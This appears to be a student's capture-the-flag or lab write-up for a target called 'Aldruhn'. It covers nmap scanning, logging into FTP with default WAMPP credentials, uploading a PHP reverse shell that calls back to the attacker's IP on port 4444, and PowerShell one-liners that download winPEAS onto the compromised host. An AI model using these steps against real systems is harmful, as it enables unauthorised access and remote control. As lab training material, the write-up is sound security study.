# Exercise 2

## Aldruhn

Host discovery – ip is 192.168.2.12

![Text Description automatically generated](media/728d73b1b034dc488107235b872c7b9c.png)

nmap basic scan

![Text Description automatically generated](media/503f26095705fea344c084e46473f86f.png)

nmap full scan: nmap -Pn -A 192.168.2.12 \> fullscan.txt

Meanwhile, we visit website on ports 80 and 443

![Text Description automatically generated](media/3efbf684f411600073d766633f4b9427.png) ![Graphical user interface, text, application, email Description automatically generated](media/abc7d06edd627aaf7ccf163b70bc18b3.png)

At tools section on the left hand side, there are various webpages. On FileZilla FTP lies an interesting image  
![Graphical user interface, text, application Description automatically generated](media/c8995bf0048c5f85e06d4bcf87469771.png)

Default installation has username: newuser and password: wampp. Try to access ftp with this credential

![Text Description automatically generated](media/2c1015791e29b4c3b42036469f81625c.png)

It works!

Upload reverse shell. First, copy from webshells dir to our dir. Then, edit file so that ip and port directs to our machine ip netcat listen port and upload

![Text Description automatically generated](media/3a5a4bf4590b6228166e2546f37fb2f7.png)

(Our machine IP on the tun0 vpn adapter)

wget -O winrevshell.php <https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php> (saves the windows php reverse shell code into winrevshell.php)

nc -nlvp 4444

Edit winrevshell.php so that its payload will send data to our machine (10.8.0.108, port 4444)

![Text Description automatically generated](media/b29bbe24dff13129ac196036b12f59bf.png)

Upload file onto target machine via ftp using the newuser credentials

![Text Description automatically generated](media/a004a57662bb0516d568375bfb4780d8.png)

Simply open the url 192.168.2.12/winrevshell.php and we get shell access

![Graphical user interface, text, application Description automatically generated](media/a202967f05bff20ebd0f52974e6ef6d5.png)

Download winPEAS from github into machine using a one-liner

powershell.exe (New-Object System.Net.WebClient).DownloadFile(' https://github.com/carlospolop/PEASS-ng/releases/download/20221023/winPEASx64.exe ','winPEAS.exe')![Text Description automatically generated](media/e2f2cc0fd516e79491ca2f471e58fe78.png)

Seems like we cannot download straight from github. Instead, download winPEAS.exe onto our kali, start a python SimpleHTTPServer and download from there

![Text Description automatically generated](media/07b58b974cec554d5318ef3251c450d1.png)

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.8.0.108/winpeas.exe ','winPEAS.exe')

![Text Description automatically generated](media/15bca327d340d1972af26ccaccfcf430.png)

Now run winpeas: winPEAS.exe

![](media/0188aa0a7ae6514aa774595aa2d881c5.png)

It says that we are already Administrator, so no need for privilege escalation
